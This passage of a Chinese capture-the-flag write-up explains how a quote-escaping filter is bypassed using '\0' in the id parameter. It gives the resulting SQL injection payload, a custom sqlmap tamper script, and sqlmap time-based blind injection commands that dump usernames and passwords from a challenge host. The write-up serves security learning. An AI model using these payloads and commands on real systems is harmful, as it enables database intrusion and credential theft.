&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输入：id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;\0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;addslashes(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\\0
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;str_replace(&lt;span style=&#34;color:#ff79c6&#34;&gt;array&lt;/span&gt;(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;0&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%00&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;),&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;echo&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;&amp;lt;br&amp;gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：\
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;select * from images where id=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$id&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39; or path=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;{&lt;/span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$path&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;./&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$row&lt;/span&gt;[&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;path&amp;#34;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;$result&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;输出：select &lt;span style=&#34;color:#ff79c6&#34;&gt;*&lt;/span&gt; from images where id&lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#39;\&amp;#39; or path=&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;or&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#6272a4&#34;&gt;#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以发现最终的形式是这样的：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;select * from images where id=&amp;#39;xxx&amp;#39; or 1#&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得出结果：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;id=\0&amp;amp;path= or 1=1 %23
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;更改or后面的值可以更改payload。由于网页正确时会返回图片，我们使用布尔盲注或者时间盲注都可以。&lt;/p&gt;
&lt;p&gt;下面演示一下使用sqlmap该怎么对这道题进行时间盲注：&lt;/p&gt;
&lt;p&gt;首先是tamper脚本的编写：&lt;/p&gt;
&lt;p&gt;在sqlmap/tamper/里新建自己中意名字的python脚本：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sys&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;path&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;append(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;E:&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;tools&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;\\&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;sqlmap&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; lib.core.enums &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; PRIORITY
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;from&lt;/span&gt; lib.core.common &lt;span style=&#34;color:#ff79c6&#34;&gt;import&lt;/span&gt; singleTimeWarnMessage
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;__priority__ &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; PRIORITY&lt;span style=&#34;color:#ff79c6&#34;&gt;.&lt;/span&gt;LOW &lt;span style=&#34;color:#6272a4&#34;&gt;# 当前脚本调用优先等级&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;dependencies&lt;/span&gt;(): &lt;span style=&#34;color:#6272a4&#34;&gt;# 声明当前脚本适用/不适用的范围，可以为空。&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    singleTimeWarnMessage(&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;这是我的tamper提示&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;tamper&lt;/span&gt;(payload, &lt;span style=&#34;color:#ff79c6&#34;&gt;**&lt;/span&gt;kwargs): &lt;span style=&#34;color:#6272a4&#34;&gt;# 用于篡改Payload、以及请求头的主要函数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    payload &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34; or &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;payload&lt;span style=&#34;color:#ff79c6&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#f1fa8c&#34;&gt;&amp;#34;%23&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#ff79c6&#34;&gt;return&lt;/span&gt; payload
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一个最小的tamper脚本结构为priority变量定义和dependencies、tamper函数定义，&lt;/p&gt;
&lt;p&gt;priority定义脚本的优先级，用于有多个tamper脚本的情况，查看lib.core.enums里的PRIORITY类可以看到详细的定义级别：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ff79c6&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#50fa7b&#34;&gt;PRIORITY&lt;/span&gt;(&lt;span style=&#34;color:#8be9fd;font-style:italic&#34;&gt;object&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOWEST &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOWER &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    LOW &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ff79c6&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    NORMAL &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGH &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGHER &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;50&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    HIGHEST &lt;span style=&#34;color:#ff79c6&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#bd93f9&#34;&gt;100&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;dependencies函数声明该脚本适用/不适用的范围，可以为空；&lt;/p&gt;
&lt;p&gt;刚才例子里使用的&lt;code&gt;singleTimeWarnMessage() &lt;/code&gt;用于在控制台中打印出警告信息：&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627261fc09475431295dc61e.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;tamper是主要的函数，接受的参数为payload和**kwargs，其中payload就是所求。kwargs为相关httpheader，想插入或则修改header的时候可以用到。&lt;/p&gt;
&lt;p&gt;如例，我的tamper里就可以这么前后一加（虽然在sqlmap里也有类似的指令），然后url变成&lt;code&gt;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=&lt;/code&gt;，再指定注入参数为path就可以了。&lt;/p&gt;
&lt;p&gt;下面是要用到的注入命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--current-db #查看当前的数据库
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--technique T  #指定注入类型
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　B: Boolean-based blind SQL injection（布尔型注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　E: Error-based SQL injection（报错型注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　U: UNION query SQL injection（可联合查询注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　S: Stacked queries SQL injection（可多语句查询注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　T: Time-based blind SQL injection（基于时间延迟注入）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;　　
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-v3  #输出详细度 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;0、只显示python错误以及严重的信息。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;1、同时显示基本信息和警告信息。（默认）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;2、同时显示debug信息。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;3、同时显示注入的payload。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;4、同时显示HTTP请求。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;5、同时显示HTTP响应头。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;6、同时显示HTTP响应页面。
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--threads 5           #指定线程数(时间盲注不推荐开多线程)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--dbms=&amp;#34;MySQL&amp;#34; #指定其数据库为mysql 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase, H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, Microsoft Access, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle, PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--time-sec #DBMS响应的延迟时间（默认为5秒）
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-p     #可测试的参数
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;--fresh-queries     #刷新缓存
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;库名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 --current-db
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62725e58094754312955451b.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;表名&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path  --time-sec 4 -D ciscnfinal --tables
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6272607009475431295a3797.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;字段(sqlmap自动用了16进制的绕过)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users --columns
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/627262bf09475431295f9d8d.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;数据&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/6272692e09475431296f1258.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里b2ff3D048fe0c0374fd7可耻的错了，刷新缓存之后是b2ff30048fe0c0374fd7，看来时间盲注还是错误率的hhh。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34; &gt;
		&lt;img src=&#34;https://pic.imgdb.cn/item/62726b99094754312974d9ee.jpg&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里能发现，sqlmap每次盲注的最后都使用一个&lt;code&gt;非&lt;/code&gt;来确定时间盲注的判断是否成功，下面接上刷新缓存的命令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 sqlmap.py -u &amp;#34;http://57d910cf-b223-4831-ac2c-3090cb6551d2.node4.buuoj.cn:81/image.php?id=\\0&amp;amp;path=1&amp;#34; --tamper=my.py -v 3 --dbms=&amp;#34;MySQL&amp;#34; --technique=T -p path   --time-sec 4 -D ciscnfinal -T users -C username,password --dump --fresh-queries
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;完成注入，可以登录了，结束。但是这里还有很多问题，比如level还没涉及到，比如知道误报之后怎么只刷新特定的缓存……&lt;/p&gt;
&lt;p&gt;推荐一个SQLMAP进阶使用的博客：&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://drops.xmd5.com/static/drops/tips-5254.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://drops.xmd5.com/static/drops/tips-5254.html&lt;/a&gt;&lt;/p&gt;
